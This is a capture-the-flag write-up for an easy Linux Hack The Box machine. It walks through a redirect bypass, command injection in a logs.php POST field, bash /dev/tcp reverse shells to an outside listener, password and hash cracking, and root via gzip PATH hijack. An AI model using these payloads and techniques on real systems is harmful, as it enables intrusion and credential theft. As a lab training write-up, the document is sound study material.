## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.104
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.104
```

---

## 🕵️ EAR Vulnerability (Execute After Redirect)
- Intercept `HTTP 302` redirect and change it to `200 OK` in Burp Suite.
- Burp ➝ Proxy ➝ Intercept Server Responses ➝ Enable ➝ Intercept Response ➝ Modify `302 Found` to `200 OK`

---

## 👤 Account Creation (via EAR Bypass)
- Navigate to `/accounts.php` using modified redirect bypass.
- Fill out user registration ➝ Login normally after creation.

---

## 📦 Download Site Source
- Navigate to `/files.php` and download `siteBackup.zip`
- Unzip to reveal all PHP source files.

---

## 🧪 Command Injection in [logs.php](HTTP.md)
### Without Source
- Interact with `file_logs.php`
- Modify POST request:
```bash
delim=comma;ping+-c+1+10.10.14.6
```

### With Source
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

---

## ⚙️ Gaining Reverse Shell (as www-data)
```bash
# Listener
nc -lnvp 443

# Burp ➝ Intercept POST ➝ Modify
POST /logs.php

delim=comma;bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' #
```

### Shell Upgrade
```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
TERM=screen
```

---

## 🔍 Enumeration (as www-data)
```bash
cat /var/www/html/config.php
mysql -u root -p'mySQL_p@ssw0rd!:)'
```

### Dump User Hash
```sql
select * from accounts;
```

### Crack Hash
```bash
hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
```

---

## 🔐 Shell as m4lwhere (via SSH)
```bash
ssh m4lwhere@10.10.11.104
# password: ilovecody112235!
```

---

## 🔼 Root Escalation — Path Hijack
### Sudo Priv
```bash
sudo -l
```
```bash
(ALL) NOPASSWD: /opt/scripts/access_backup.sh
```

### Create Malicious gzip
```bash
cd /dev/shm
echo '#!/bin/bash' > gzip
echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' >> gzip
chmod +x gzip
export PATH=/dev/shm:$PATH

# Listener:
nc -lnvp 443

# Trigger
sudo /opt/scripts/access_backup.sh
```

---

## ✅ Root Access
```bash
cat /root/root.txt
```

---

## 📚 Resources
- EAR Ref: OWASP Execute After Redirect
- SQLi INSERT Exploit: George Koniaris video
- Beyond Root:
  - Misconfigured `/etc/sudoers`
  - `secure_path` omitted ➝ Path Hijack vulnerability